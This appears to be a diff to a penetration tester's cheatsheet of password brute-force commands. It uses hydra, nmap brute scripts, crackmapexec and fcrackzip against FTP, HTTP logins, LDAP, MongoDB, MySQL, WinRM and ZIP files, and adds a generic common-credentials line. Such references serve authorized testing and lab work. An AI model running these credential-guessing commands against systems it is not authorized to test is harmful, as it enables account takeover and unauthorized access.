@@ -1,10 +1,10 @@
 % bruteforce
 
 # FTP Bruteforce
-hydra -l <USERNAME> -P <PASSWORDLIST> -t 32 <IP> ftp
+hydra -l <USERNAME> -P <PASSWORDLIST> -t 32 <IP> ftp -v -V
 
 # HTTP Basic Auth Bruteforce
-hydra -L <USERNAMELIST> -P <PASSWORDLIST> <IP> http-get <PATH>
+hydra -L <USERNAMELIST> -P <PASSWORDLIST> <IP> http-get <PATH> -v -V
 
 # HTTP POST Bruteforce
 hydra -L <USERNAMELIST> -P <PASSWORDLIST> <IP> http-post-form "<PATH>:username=^USER^&password=^PASS^&enter=Sign+in:<INCORRECT_MSG>" -V -v
@@ -16,10 +16,13 @@ sudo nmap --script ldap-brute -p 389 <IP>
 sudo nmap -sV --script mongodb-brute -n -p 27017 <IP>
 
 # MYSQL Bruteforce
-hydra -L <USERNAMELIST> -P <PASSLIST> <IP> mysql
+hydra -L <USERNAMELIST> -P <PASSLIST> <IP> mysql -v -V
 
 # WinRM bruteforce
 cme winrm <IP> -d <DOMAIN> -u <USERNAMELIST> -p <PASSWORDLIST>
 
 # ZIP Bruteforce
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <ZIPFILE>
+
+# Brute force services with common creds
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt <IP> <service> -v -V
